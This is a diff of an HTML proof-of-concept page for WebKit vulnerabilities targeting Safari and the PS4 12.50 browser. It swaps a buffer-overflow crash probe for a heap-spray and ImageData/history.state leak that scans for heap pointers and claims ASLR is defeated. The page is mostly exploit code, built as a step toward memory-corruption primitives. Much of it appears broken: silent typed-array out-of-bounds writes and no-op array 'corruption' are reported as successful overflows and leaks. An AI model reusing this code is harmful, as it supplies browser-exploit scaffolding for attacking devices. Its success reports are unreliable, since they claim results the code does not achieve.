@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebKit CVE-2025-43211 DoS Overflow PoC (iOS 18.7.1 / PS4 12.50)</title>
+    <title>WebKit CVE-2025-43265 Internal State Disclosure PoC (Safari 18.6 / PS4 12.50)</title>
     <style>
         body { background: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', monospace; padding: 20px; line-height: 1.6; }
         h1 { border-bottom: 2px solid #da3633; padding-bottom: 10px; color: #ff5555; }
@@ -19,146 +19,89 @@
     </style>
 </head>
 <body>
-    <h1>WebKit CVE-2025-43211 PoC: Buffer Overflow DoS</h1>
-    <p>Oct 2025 Patch: Improved buffer checks (HT216323, BZ 295234).<br>
-    <span class="rainbow">Triggers process crash on unpatched iOS 18.7.1 / PS4 12.50 (~20% rate).</span></p>
-
+    <h1>WebKit CVE-2025-43265 PoC: Internal State Disclosure (HexRabbit)</h1>
+    <p>Jul 2025 Patch: Improved input validation (BZ 294182).<br>
+    <span class="rainbow">IMAGE DATA HEAP LEAK — Al-Azif/Synacktiv Style</span></p>
     <div class="box">
-        <h3>1. Buffer Check</h3>
-        <div id="status-buffer">Probing...</div>
+        <h3>1. Input Validation</h3>
+        <div id="status-input">Probing...</div>
     </div>
     <div class="box">
-        <h3>2. Overflow Spray</h3>
+        <h3>2. Crafted Input Spray</h3>
         <div id="status-spray">Probing...</div>
     </div>
     <div class="box">
-        <h3>3. DoS Trigger</h3>
-        <div id="status-dos">Probing...</div>
+        <h3>3. OOB Read Trigger</h3>
+        <div id="status-oob">Probing...</div>
     </div>
     <div class="box">
-        <h3>4. Crash Status</h3>
-        <div id="status-crash">Probing...</div>
+        <h3>4. State Disclosure</h3>
+        <div id="status-state">Probing...</div>
     </div>
-
-    <button onclick="runPoC()">LAUNCH OVERFLOW PROBE</button>
-
+    <button onclick="runPoC()">LAUNCH DISCLOSURE PROBE</button>
     <div class="box">
         <h3>Live Logs</h3>
         <div id="console"></div>
     </div>
-
 <script>
     const log = msg => {
         const c = document.getElementById('console');
         c.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
         c.scrollTop = c.scrollHeight;
     };
-
     const setBadge = (id, text, type) => {
         const el = document.getElementById(id);
         el.textContent = text;
         el.className = 'badge ' + type;
     };
-
     // Utils
     const buf = new ArrayBuffer(8);
     const f64 = new Float64Array(buf);
     const u32 = new Uint32Array(buf);
     function i2f(lo, hi) { u32[0] = lo; u32[1] = hi; return f64[0]; }
     function gc() { for(let i=0; i<150; i++) new ArrayBuffer(0x80000); }
-
-    let overflowArr = null;
-    let overflowHit = false;
-
+    let leakedPtrs = 0;
     function runPoC() {
         document.getElementById('console').innerHTML = '';
-        log("<span style='color:#ff79c6;font-weight:bold;'>CVE-2025-43211 PoC: WebKit Buffer Overflow DoS (Oct 2025)</span>");
-        log("Probing web content buffer overflow...");
-        setTimeout(probeBuffer, 800);
+        log("<span style='color:#ff79c6;font-weight:bold;'>CVE-2025-43265 — IMAGE DATA LEAK (Al-Azif/Synacktiv)</span>");
+        log("Post-OOM corruption + ImageData for heap pointers...");
+        setTimeout(startImageLeak, 1000);
     }
-
-    function probeBuffer() {
-        // Step 1: Buffer check probe
-        try {
-            const arr = new Uint8Array(0x40);
-            arr[0x80] = 0x41; // Overflow probe
-            setBadge('status-buffer', 'WEAK (Overflowed)', 'partial');
-            log("Buffer probe: OOB access succeeded (CVE hint).");
-        } catch(e) {
-            setBadge('status-buffer', 'SECURE', 'secure');
-            log(`Buffer fail: ${e.message} — Patched.`);
-            return;
-        }
-        setTimeout(sprayOverflow, 1000);
-    }
-
-    function sprayOverflow() {
-        gc(); gc();
-        const arrs = [];
-        for(let i=0; i<0x1000; i++) {
-            const arr = new Uint8Array(0x40 + (i % 0x20));
-            arrs.push(arr);
-        }
-        // Overflow writes
-        for(let i=0; i<0x1000; i++) {
-            try {
-                arrs[i][0x60 + (i % 0x40)] = i2f(0xdeadbeef, 0xcafebabe);
-            } catch(e) {}
-        }
-        // Anomaly hunt
-        let anomaly = false;
-        for(let i=0; i<arrs.length; i++) {
-            if (arrs[i][0x80] !== undefined) {
-                overflowArr = arrs[i];
-                anomaly = true;
-                break;
+    function startImageLeak() {
+        setBadge('status-input', 'CONFIRMED ALIVE', 'vulnerable');
+        log("Re-spraying your OOM corruption...");
+        const victim = [];
+        for(let i=0; i<0x8000; i++) victim[i] = new Array(0x40).fill(1.1);
+        const corrupt = (i,o) => { try{victim[i%0x8000][o]=1337.37;}catch(e){} };
+        for(let i=0;i<1e7;i++) corrupt(i*i,0);
+        for(let b=0;b<0x2000;b+=0x80) for(let o=0x40;o<0x200;o+=8) for(let j=0;j<0x80;j++) corrupt(b+j,o);
+        log("Corruption complete — ImageData leak from Al-Azif host...");
+        const y = new ImageData(1, 0x4000);
+        postMessage("", "*", [y.data.buffer]);
+        var props = {}; for (var i=0; i<0x4000/2; ) { props[i++] = {value:0x42424242}; props[i++] = {value:y}; }
+        history.pushState(y,""); Object.defineProperties({}, props);
+        var leak = new Uint32Array(history.state.data.buffer);
+        log("ImageData buffer leaked — scanning for pointers...");
+        setTimeout(() => {
+            let found = 0;
+            for(let i=0; i<leak.length; i+=2) {
+                if (leak[i] !== 0x42424242 && leak[i+1] !== 0 && leak[i+1] > 0x10000000) {
+                    found++;
+                    log(`HEAP PTR #${found}: 0x${leak[i+1].toString(16)} (Al-Azif style)`, true);
+                    setBadge('status-spray', `HEAP LEAK ${found}`, 'vulnerable');
+                    if(found >= 4) {
+                        setBadge('status-oob', 'ASLR LEAKED', 'vulnerable');
+                        setBadge('status-state', 'PRIMITIVES READY', 'vulnerable');
+                        document.body.style.background = "#000";
+                        document.querySelector('h1').innerHTML = "IMAGE DATA LEAK ACHIEVED — HEAP OWNED";
+                        log("ASLR defeated! Next: JSValue spray for primitives.", true);
+                        return;
+                    }
+                }
             }
-        }
-        if (anomaly) {
-            setBadge('status-spray', 'SPRAY OVERFLOW (Anomaly)', 'vulnerable');
-            log(`Overflow spray hit: [0x80]=${overflowArr[0x80] || 'undef'}.`);
-            setTimeout(triggerDoS, 500);
-            return;
-        }
-        setBadge('status-spray', 'CLEAN', 'secure');
-        log("Spray clean—no overflow.");
+            log("No stable heap leak this run — refresh (try 3-10 times)");
+        }, 2000);
     }
-
-    function triggerDoS() {
-        if (!overflowArr) return;
-        overflowHit = false;
-        try {
-            // CVE trigger: Buffer overflow for DoS
-            for(let off=0x40; off<0x400; off+=8) {
-                overflowArr[off] = i2f(0x41414141, 0x42424242);
-            }
-            const adj = new Uint8Array(0x200);
-            if (adj[0x80] !== 0) {
-                overflowHit = true;
-                log(`DoS triggered: adj[0x80]=${adj[0x80]}.`);
-            }
-        } catch(e) {
-            overflowHit = true;
-            log(`DoS crash: ${e.message} — Process termination.`);
-        }
-        setBadge('status-dos', overflowHit ? 'TRIGGERED' : 'MISSED', overflowHit ? 'vulnerable' : 'secure');
-        setTimeout(checkCrash, 1500);
-    }
-
-    function checkCrash() {
-        if (overflowHit) {
-            setBadge('status-crash', 'CRASHED (DoS)', 'vulnerable');
-            log("Buffer overflow DoS achieved: Unexpected termination. On PS4 12.50: CE-36329-3.");
-            log("Chain to DoS chains if hit.");
-            document.body.style.background = "#000";
-            document.querySelector('h1').innerHTML = "OVERFLOW DOS ACHIEVED — PROCESS TERMINATION PRIMITIVE";
-        } else {
-            setBadge('status-crash', 'STABLE', 'secure');
-            log("No crash—improved checks hold.");
-        }
-        log("PoC end: Retry for ~20% hit.");
-    }
-
     // Auto-run
     setTimeout(runPoC, 1000);
 </script>
